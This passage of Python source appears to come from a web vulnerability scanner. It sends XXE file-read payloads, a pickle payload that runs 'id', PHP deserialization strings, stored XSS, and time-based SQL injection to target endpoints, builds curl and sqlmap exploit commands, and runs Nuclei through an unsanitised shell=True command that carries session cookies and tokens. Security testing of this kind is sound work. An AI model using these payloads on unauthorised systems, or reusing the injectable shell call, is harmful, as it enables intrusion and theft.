            if "TLSv1.0" in output: issues.append("TLS 1.0 enabled (deprecated)")
            if "RC4" in output or "DES" in output: issues.append("Weak cipher suite")
            if "EXPIRED" in output.upper(): issues.append("SSL certificate expired")
            if issues:
                return Finding(
                    owasp_id="A02", owasp_name="Cryptographic Failures",
                    title=f"SSL/TLS weakness ({len(issues)} issues)",
                    risk="High", confidence=85,
                    url=ep.url, method="GET", param="SSL/TLS", payload="",
                    evidence="; ".join(issues),
                    baseline_diff="", tool_output=output[:400],
                    request_raw=f"nmap ssl-enum-ciphers {host}",
                    response_raw=output[:400],
                    exploit_cmd=f"testssl.sh {host}",
                    remediation="Disable SSLv3/TLS1.0, remove weak ciphers.",
                )
        return None

    # ── XXE Probe ────────────────────────────────────────────────────────────
    def _xxe_probe(self, ep: Endpoint, param_key: str,
                   param_name: str, base_fp: BaselineFingerprint) -> Optional[Finding]:
        """XML External Entity injection test."""
        xxe_payloads = [
            # Basic file read
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
             '"file:///etc/passwd">]><foo>&xxe;</foo>'),
            # Windows
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
             '"file:///c:/windows/win.ini">]><foo>&xxe;</foo>'),
            # Parameter entity (blind)
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
             '"http://127.0.0.1:8080/"> %xxe;]><foo>test</foo>'),
            # CDATA exfil
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
             '"file:///etc/hostname">]><root><data>&xxe;</data></root>'),
        ]
        for payload in xxe_payloads:
            resp = self.client.post(ep.url, data=payload,
                                   extra_headers={"Content-Type": "application/xml"})
            body = resp.get("body", "")
            # Check for file content leaks
            if ("root:" in body and "/bin/" in body) or \
               "[extensions]" in body or \
               (resp.get("status") == 200 and len(body) > len(base_fp.body_len or 0) + 100):
                return Finding(
                    owasp_id="A03", owasp_name="Injection",
                    title=f"XXE — XML External Entity Injection: {ep.url}",
                    risk="Critical", confidence=90,
                    url=ep.url, method="POST", param=param_key,
                    payload=payload[:200],
                    evidence=f"XXE file read successful: {body[:200]}",
                    baseline_diff="xxe_probe",
                    tool_output=body[:400],
                    request_raw=f"POST {ep.url}\nContent-Type: application/xml\n\n{payload[:300]}",
                    response_raw=body[:400],
                    exploit_cmd=f"curl -X POST -H 'Content-Type: application/xml' -d '{payload[:200]}' '{ep.url}'",
                    remediation="Disable external entity processing in XML parser. Use JSON instead.",
                    confirmed=True, tool="xxe_probe",
                )
        return None

    # ── Deserialization Probe ────────────────────────────────────────────────
    def _deser_probe(self, ep: Endpoint, param_key: str,
                     param_name: str, base_fp: BaselineFingerprint) -> Optional[Finding]:
        """A08 Insecure Deserialization — Java/Python/PHP/Node payload test."""
        lang = self.site_tech.get("lang", "unknown")

        # Java deserialization markers
        java_payloads = [
            ("java_oob", base64.b64decode(
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
            ).decode("latin-1", errors="replace")),
        ]
        # PHP object injection
        php_payloads = [
            ("php_serialize", 'O:8:"stdClass":1:{s:4:"test";s:2:"id";}'),
            ("php_phar", 'phar://test.phar'),
        ]
        # Python pickle
        python_payloads = [
            ("python_pickle_b64", "Y29zCnN5c3RlbQooUydpZCcKdFIu"),
        ]

        test_sets = []
        if lang in ("java", "unknown"):
            test_sets.extend(java_payloads)
        if lang in ("php", "unknown"):
            test_sets.extend(php_payloads)
        if lang in ("python", "unknown"):
            test_sets.extend(python_payloads)

        for name, payload in test_sets[:6]:
            # Send body raw
            resp = self.client.post(ep.url, data=payload,
                                   extra_headers={"Content-Type": "application/octet-stream"})
            body = resp.get("body", "")
            status = resp.get("status", 0)
            timing = resp.get("timing", 0)

            # Deserialization indicators
            deser_indicators = [
                "java.io" in body or "ClassNotFoundException" in body,
                "unserialize()" in body or "O:8:" in body,
                "pickle" in body.lower() or "unpickle" in body.lower(),
                status == 500 and "deserialization" in body.lower(),
                status == 500 and timing > 5.0,  # Gadget chain execution delay
                "uid=" in body and "gid=" in body,  # RCE achieved
            ]
            if any(deser_indicators):
                return Finding(
                    owasp_id="A08",
                    owasp_name="Software and Data Integrity Failures",
                    title=f"Insecure Deserialization [{name}]: {ep.url}",
                    risk="Critical" if "uid=" in body else "High",
                    confidence=85 if "uid=" in body else 70,
                    url=ep.url, method="POST", param=param_key,
                    payload=str(payload)[:200],
                    evidence=f"Deserialization indicator: {body[:200]}",
                    baseline_diff="deser_probe",
                    tool_output=body[:400],
                    request_raw=f"POST {ep.url}\n\n{str(payload)[:200]}",
                    response_raw=body[:400],
                    exploit_cmd=f"# Use ysoserial (Java) or phpggc (PHP) for full exploitation",
                    remediation="Never deserialize untrusted data. Use JSON/protobuf instead.",
                    confirmed="uid=" in body, tool="deser_probe",
                )

        # Cookie-based deserialization test
        for cookie_name, cookie_value in self.client.session.cookies.items():
            # Check if cookie looks serialized (base64 encoded objects)
            try:
                decoded = base64.b64decode(cookie_value + "==").decode("latin-1", errors="replace")
                if any(marker in decoded for marker in ["java.", "O:", "rO0", "pickle"]):
                    return Finding(
                        owasp_id="A08",
                        owasp_name="Software and Data Integrity Failures",
                        title=f"Serialized Object in Cookie '{cookie_name}': {ep.url}",
                        risk="High", confidence=75,
                        url=ep.url, method="GET", param=f"cookie:{cookie_name}",
                        payload=cookie_value[:100],
                        evidence=f"Cookie '{cookie_name}' contains serialized object data",
                        baseline_diff="cookie_deser_check",
                        tool_output=decoded[:200],
                        request_raw=f"Cookie: {cookie_name}={cookie_value[:50]}...",
                        response_raw="",
                        exploit_cmd="# Tamper cookie with ysoserial/phpggc payload",
                        remediation="Use signed JWT or encrypted tokens instead of serialized objects.",
                        tool="deser_probe",
                    )
            except Exception:
                pass
        return None

    # ── Stored XSS Detection ────────────────────────────────────────────────
    def _stored_xss_check(self, ep: Endpoint, param_key: str,
                          param_name: str) -> Optional[Finding]:
        """
        Stored XSS — submits payload, then detects it on another page.
        Unlike reflected XSS: payload is stored and returns in a separate request.
        """
        marker = f"XSSTEST{int(time.time())}"
        xss_payload = f'"><img src=x onerror=alert("{marker}")>'

        # 1. Submit payload
        if ep.method == "POST":
            params = dict(ep.params)
            params[param_key] = xss_payload
            clean_params = {k.split(":")[-1]: v for k, v in params.items()
                          if not k.startswith("header:")}
            self.client.post(ep.url, data=clean_params)
        else:
            parsed = urllib.parse.urlparse(ep.url)
            qs = dict(urllib.parse.parse_qsl(parsed.query))
            qs[param_key.split(":")[-1]] = xss_payload
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(qs)))
            self.client.get(test_url)

        time.sleep(0.5)

        # 2. Re-request the page (different session / clean request)
        resp = self.client.get(ep.url)
        if marker in resp.get("body", ""):
            return Finding(
                owasp_id="A03", owasp_name="Injection",
                title=f"Stored XSS: {ep.url} param={param_name}",
                risk="High", confidence=85,
                url=ep.url, method=ep.method, param=param_key,
                payload=xss_payload,
                evidence=f"Stored XSS marker '{marker}' found in subsequent GET response",
                baseline_diff="stored_xss_check",
                tool_output=resp.get("body", "")[:300],
                request_raw=f"POST {ep.url}\n{param_name}={xss_payload}",
                response_raw=resp.get("body", "")[:300],
                exploit_cmd=f"curl -X POST -d '{param_name}={urllib.parse.quote(xss_payload)}' '{ep.url}'",
                remediation="Sanitize ALL user input before storage. Use Content-Security-Policy.",
                confirmed=True, tool="stored_xss",
            )
        return None

    # ── Second-Order SQLi ────────────────────────────────────────────────────
    def _second_order_sqli_check(self, ep: Endpoint, param_key: str,
                                  param_name: str) -> Optional[Finding]:
        """
        Second-order SQLi — payload is stored in one place, executed in another.
        Example: register(username="admin'--") → login → error on profile page.
        """
        sqli_markers = [
            ("sleep_test", "admin'; WAITFOR DELAY '0:0:5'--", 5.0),
            ("error_test", "admin' AND 1=CONVERT(int,'test')--", 0),
            ("union_test", "' UNION SELECT NULL,NULL,NULL--", 0),
        ]

        for name, payload, expected_delay in sqli_markers[:2]:
            # 1. Submit payload (store it)
            if ep.method == "POST":
                params = dict(ep.params)
                params[param_key] = payload
                clean_params = {k.split(":")[-1]: v for k, v in params.items()
                              if not k.startswith("header:")}
                self.client.post(ep.url, data=clean_params)
            else:
                continue  # Stored injection via GET is rare

            time.sleep(0.3)

            # 2. Test trigger endpoints
            trigger_paths = [
                ep.url,  # The same page itself
                urllib.parse.urljoin(ep.url, "profile"),
                urllib.parse.urljoin(ep.url, "dashboard"),
                urllib.parse.urljoin(ep.url, "account"),
            ]
            for trigger_url in trigger_paths:
                t0 = time.time()
                resp = self.client.get(trigger_url)
                elapsed = time.time() - t0
                body = resp.get("body", "").lower()

                sqli_indicators = [
                    "sql" in body and ("syntax" in body or "error" in body),
                    "mysql" in body or "postgresql" in body or "sqlite" in body,
                    "odbc" in body or "oracle" in body,
                    expected_delay > 0 and elapsed >= expected_delay - 0.5,
                    "unclosed quotation" in body,
                ]
                if any(sqli_indicators):
                    return Finding(
                        owasp_id="A03", owasp_name="Injection",
                        title=f"Second-Order SQLi [{name}]: {ep.url} → {trigger_url}",
                        risk="Critical", confidence=80,
                        url=ep.url, method="POST", param=param_key,
                        payload=payload,
                        evidence=f"Injected via {ep.url}, triggered at {trigger_url}. "
                                 f"{'Time-based: ' + str(round(elapsed, 1)) + 's' if expected_delay else 'Error-based: ' + body[:150]}",
                        baseline_diff="second_order_sqli",
                        tool_output=resp.get("body", "")[:400],
                        request_raw=f"POST {ep.url}\n{param_name}={payload}",
                        response_raw=resp.get("body", "")[:300],
                        exploit_cmd=f"sqlmap -u '{trigger_url}' --second-url='{ep.url}' --data='{param_name}={payload}'",
                        remediation="Use parameterized queries for ALL database operations including stored data retrieval.",
                        confirmed=True, tool="second_order_sqli",
                    )
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _fuzz_request(self, ep: Endpoint, param_key: str,
                      param_name: str, payload: str) -> dict:
        params = dict(ep.params)
        params[param_key] = payload
        if ep.method == "GET":
            parsed = urllib.parse.urlparse(ep.url)
            qs     = dict(urllib.parse.parse_qsl(parsed.query))
            qs[param_key.split(":")[-1]] = payload
            new_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
            return self.client.get(new_url)
        clean = {k.split(":")[-1]: v for k, v in params.items()
                 if not k.startswith("header:") and not k.startswith("path:")}
        if ep.body_type == "json":
            return self.client.post(ep.url, json_data=clean)
        return self.client.post(ep.url, data=clean)

    def _inject_fuzz(self, url: str, param_key: str, placeholder: str) -> str:
        param_name = param_key.split(":")[-1]
        parsed     = urllib.parse.urlparse(url)
        qs         = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param_name] = placeholder
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _rebuild_url(self, url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _get_relevant_params(self, ep: Endpoint, param_types: list) -> list:
        if not param_types:
            return []
        relevant = []
        for k in ep.params:
            prefix = k.split(":")[0]
            if prefix in param_types or any(t in prefix for t in param_types):
                relevant.append(k)
        for k in ep.params:
            if ":" not in k:
                relevant.append(k)
        return list(dict.fromkeys(relevant))

    def _get_quick_payloads(self, check_id: str) -> list:
        """
        Quick inline payloads — used separately from wordlist tools
        for fast baseline diff checking.
        """
        return {
            "A03_sqli":  self.SQLI_QUICK,
            "A03_xss":   self.XSS_QUICK,
            "A03_lfi":   self.LFI_QUICK,
            "A03_cmdi":  self.CMDI_QUICK,
            "A10_ssrf":  self.SSRF_QUICK,
            "A03_ssti":  self.SSTI_QUICK,
            "A03_xxe":   self.XXE_QUICK,
            "A08_deser": self.DESER_QUICK_PHP,
        }.get(check_id, ["test", "1", "'", "<"])

    def _diff_is_interesting(self, diff: dict) -> bool:
        return (
            diff.get("status_changed") or
            diff.get("time_anomaly") or
            diff.get("new_errors") or
            diff.get("size_pct", 0) > 25
        )

    def _build_request_str(self, ep: Endpoint, param_key: str, payload: str) -> str:
        pname = param_key.split(":")[-1]
        if ep.method == "GET":
            return f"GET {ep.url}?{pname}={urllib.parse.quote(payload)} HTTP/1.1\nHost: {urllib.parse.urlparse(ep.url).netloc}"
        return f"POST {ep.url} HTTP/1.1\nHost: {urllib.parse.urlparse(ep.url).netloc}\nContent-Type: application/x-www-form-urlencoded\n\n{pname}={urllib.parse.quote(payload)}"

    def _print_finding(self, f: Finding):
        colors = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan","Info":"dim"}
        c = colors.get(f.risk, "white")
        console.print(f"  [{c}][{f.risk}][/{c}] [bold]{f.owasp_id} — {f.title}[/bold] [dim](conf: {f.confidence}%)[/dim]")
        if f.evidence:
            console.print(f"    [dim]Evidence: {f.evidence[:100]}[/dim]")

class NucleiRunner:
    """
    Uses Nuclei templates matching the tech stack.
    WordPress → wordpress tags. Spring → spring tags. Etc.
    """
    OWASP_MAP = {
        "sqli":"A03","xss":"A03","lfi":"A03","rce":"A03","ssti":"A03",
        "ssrf":"A10","xxe":"A03","cmdi":"A03","idor":"A01","bac":"A01",
        "auth":"A07","cors":"A05","misconfig":"A05","exposure":"A05",
        "cve":"A06","default":"A07","takeover":"A01","jwt":"A02",
    }

    def run(self, target: str, tech: dict, session: SessionContext) -> List[Finding]:
        if not shutil.which("nuclei"):
            return []

        tags = ["cve","misconfig","exposure","default-login","takeover","tech"]
        if tech.get("cms") == "wordpress":   tags.append("wordpress")
        if tech.get("lang") == "php":        tags.append("php")
        if tech.get("framework") == "spring":tags.append("spring")
        if tech.get("framework") == "django":tags.append("django")
        if tech.get("server") == "apache":   tags.append("apache")
        if tech.get("server") == "nginx":    tags.append("nginx")
        if tech.get("db") == "mongodb":      tags.append("mongodb")

        # Auth headers
        auth_flags = ""
        if session.cookies:
            c = "; ".join(f"{k}={v}" for k,v in session.cookies.items())
            auth_flags += f" -H 'Cookie: {c}'"
        if session.jwt_token:
            auth_flags += f" -H 'Authorization: Bearer {session.jwt_token}'"

        out_file = "/tmp/nuclei_mega_out.txt"
        cmd = (f"nuclei -u '{target}' -tags '{','.join(tags)}' "
               f"-severity critical,high,medium -silent -timeout 8 "
               f"-o '{out_file}' {auth_flags}")

        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=200)

        findings = []
        if not Path(out_file).exists(): return findings

        pat = re.compile(r'\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)(?:\s+\[([^\]]*)\])?')
        risk_map = {"critical":"Critical","high":"High","medium":"Medium","low":"Low","info":"Info"}

        for line in Path(out_file).read_text().splitlines():
            m = pat.search(line)
            if not m: continue
            tmpl_id = m.group(2)
            risk    = risk_map.get(m.group(3).lower(), "Medium")
            url     = m.group(4)
            match   = m.group(5) or ""
            owasp   = "A06"
            for kw, oid in self.OWASP_MAP.items():
                if kw in tmpl_id.lower():
                    owasp = oid; break

            findings.append(Finding(
                owasp_id=owasp, owasp_name={"A06":"Vulnerable Components","A03":"Injection","A05":"Security Misconfiguration","A01":"Broken Access Control","A07":"Auth Failures","A10":"SSRF","A02":"Cryptographic Failures"}.get(owasp,""),
                title=f"[Nuclei] {tmpl_id}",
                risk=risk, confidence=88 if risk in ("Critical","High") else 70,
                url=url, method="GET", param=tmpl_id,
                payload=match[:200],
                evidence=line.strip()[:300],
                baseline_diff="nuclei_template_match",
                tool_output=line.strip()[:300],
                request_raw=f"nuclei -u {url} -tags {','.join(tags)}",
                response_raw=match[:200],
                exploit_cmd=f"nuclei -u '{url}' -id '{tmpl_id}'",
                remediation=f"Fix {tmpl_id} vulnerability. Check nuclei template for remediation.",
                confirmed=risk in ("Critical","High"), tool="nuclei",
            ))
            console.print(f"  [bold red]🎯 Nuclei [{risk}] {tmpl_id[:60]}[/bold red]")
        return findings

__all__ = ['KaliToolRunner', 'OWASPFuzzEngine', 'NucleiRunner']
